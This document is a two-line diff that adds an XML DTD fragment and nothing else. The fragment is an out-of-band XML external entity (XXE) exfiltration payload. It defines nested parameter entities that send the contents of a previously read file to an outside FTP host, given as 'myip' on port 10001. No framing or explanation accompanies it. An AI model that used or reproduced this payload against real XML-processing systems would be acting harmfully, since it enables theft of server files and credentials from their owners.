@@ -1,0 +1,2 @@
+<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'ftp://%file;@myip:10001/'>">
+%start;
